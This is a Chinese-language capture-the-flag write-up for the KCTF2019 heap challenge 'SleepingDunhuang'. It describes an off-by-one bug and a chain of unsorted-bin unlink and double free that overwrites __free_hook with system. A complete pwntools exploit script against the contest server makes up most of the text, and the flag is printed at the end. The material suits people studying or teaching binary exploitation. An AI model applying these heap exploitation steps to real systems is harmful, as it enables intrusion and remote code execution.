---
title: 沉睡的敦煌
categories:
- KCTF2019
---
# KCTF2019 SleepingDunhuang

## 前言

这题太坑了，最开始edit的次数限制是2，做出来之后远程一直不通，问了客服才知道临时换题了，目次2次有多解，事实证明2次的确多解了，嗨呀早点做就好了。

## 程序逻辑

程序有4个功能，但是使用起来有诸多限制。

![main](./1.jpg)

![menu](./2.jpg)

Malloc的地址限制在bss某个地址上的值[0,800]范围内，这里初始化成heap_base，有个gift可以泄露堆地址。啊对每次Malloc(0x28)但是读0x29，可以off-by-one，修改下一个chunk的prev_size和size的低字节。

![malloc](./3.jpg)

Free应该没什么毛病

![free](./4.jpg)

Edit只能有一次机会。

![edit](./5.jpg)

## 漏洞利用

看了下出题人的发帖，似乎之前普及过unlink的出题思路2333，首先要泄露出来libc，构造unsorted bin。使用off-by-one申请chunk[i]，然后修改chunk[i+1]的size为0x90并释放chunk[i+1]，最终free7个0x90的块，此后0x90再释放就会进unsorted bin。

之后最开始我构造overlap chunk然后double free到一个释放的unsorted bin上修改其prev_size和size，实际上不用这么麻烦(且之后会出问题)，可以先free一个中间块，再malloc它，在其中构造fake_chunk(大小为0x20)+0x20+'\x90'从而使其下一个chunk的prev_size为0x20，size为0x90，之前我们提到再释放0x90的块就会使其进入unsorted bin，现在释放这个chunk即可unlink。之后再add两次就可以得到重合堆块了，从而double free。

具体地，我们先对0x404178位置的块进行unlink，铺垫一下。

之后用double free分配到第一个堆块(这个堆地址存储在0x404060中)，对这个块再用相同的方法unlink，从而使得0x404060的值为0x404048，进而Malloc的限制变成了0x404048-0x404048+0x800，我们用Edit编辑0x404060-0x404088，伪造一个假堆块0x404060，0x404078填0x404070即可free0x404060这个块到tcache里，再malloc就可以绕过检查，编辑0x404070开始的0x28区域，去掉所有的限制，之后free_hook改成system，Free一个"/bin/sh\x00"的块即可执行system("/bin/sh\x00")

## exp.py
```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
gadgets = [0x4f2c5,0x4f322,0x10a38c]

if debug:
    p = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_offset = 0x3ebc40
else:
    p = remote('152.136.18.34',10001)
    libc = ELF('./libc-2.27.so')
    libc_offset = 0x3ebc40


def add(index,content):
    p.recvuntil('4.show\n')
    p.sendline('1')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('gift: ')
    gift = int(p.recvline().strip('\n'),16)
    log.info('gift value => ' + hex(gift))
    p.recvuntil('content:\n')
    p.send(content)
    return gift

def Malloc1(index,content):
    p.recvuntil('4.show\n')
    p.sendline('1')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.send(content)
    '''
    p.recvuntil('content:\n')
    p.send(content)
    '''


def delete(index):
    p.recvuntil('4.show\n')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil('4.show\n')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.send(content)

def Show(index):
    p.recvuntil('4.show\n')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index))

def exp():
    ##0~13
    for i in range(0,14,2):
        add(i,'a'*0x10)
        add(i+1,'a'*0x10)
        delete(i)
        add(i,'a'*0x28+'\x91')
        delete(i+1)


    add(14,'0000')
    add(15,'1111')
    add(16,'2222')
    add(17,'3333') #1
    add(18,"4444") #2
    add(19,"5555")
    add(20,"6666")

    ##unlink
    delete(16)
    payload = p64(0)+p64(0x21)
    payload += p64(0x404178-0x18)+p64(0x404178-0x10)
    payload += p64(0x20) + '\x90'
    heap_ptr = add(31,payload)
    print hex(heap_ptr)
    heap_base = heap_ptr - 0x5a0
    delete(17)


    ##double free
    add(17,'\n')
    add(21,'\n')
    add(22,'\n') #22==18
    delete(19)
    delete(22)
    delete(18)

    add(18,p64(0)+p64(0x31)+p64(heap_base+0x260))
    add(22,'\n')



    ##unlink
    add(23,p64(0)+p64(0x21)+p64(0x404060-0x18)+p64(0x404060-0x10)+p64(0x20))
    delete(14)
    add(14,p64(0)*4+p64(0x300)+'\x90')
    delete(15)


    payload = p64(0)+p64(0x31)+p64(0)+p64(0x404170)
    edit(31,payload)


    delete(31)
    #get 0x404170 in chunks

    add(31,p64(0x404170)*3+p32(1)+p32(5))
    edit(23,'a'*0x18)

    Show(23)
    #leak libc
    p.recvuntil('a'*0x18)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 96 - libc_offset
    log.success('libc base => ' + hex(libc_base))
    #get shell

    free_hook = libc_base + libc.symbols['__free_hook']
    shell_addr = libc_base + libc.symbols['system']

    edit(30,p64(free_hook))
    edit(30,p64(shell_addr))
    #gdb.attach(p)
    edit(14,'/bin/sh\x00')
    delete(14)
    p.interactive()

exp()

#flag{d86d52b3-8794-4b81-babf-24a2ef30dc65}
```
